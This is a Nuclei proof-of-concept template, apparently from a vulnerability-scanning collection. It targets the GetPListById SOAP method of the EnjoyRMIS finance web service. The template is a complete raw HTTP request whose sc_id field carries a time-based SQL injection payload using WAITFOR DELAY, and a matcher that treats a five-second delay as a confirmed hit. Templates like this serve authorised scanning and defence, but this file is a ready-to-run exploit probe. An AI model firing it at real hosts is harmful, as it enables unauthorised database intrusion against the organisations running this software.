pocs/nuclei/angjie-GetPListById-sqli.yaml

id: angjie-GetPListById-sqli

info:
  name: angjie-GetPListById-sqli
  author: apple
  severity: high
  description: 接口EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx?wsdl基本都存在 sql 注入。
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |-
        POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0
        SOAPAction: http://tempuri.org/GetPListById
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}
        Content-Length: 311

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
           <soap:Header/>
           <soap:Body>
              <tem:GetPListById>
                 <!--type: string-->
                 <tem:sc_id>gero et';WAITFOR DELAY '0:0:5'--</tem:sc_id>
              </tem:GetPListById>
           </soap:Body>
        </soap:Envelope>
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and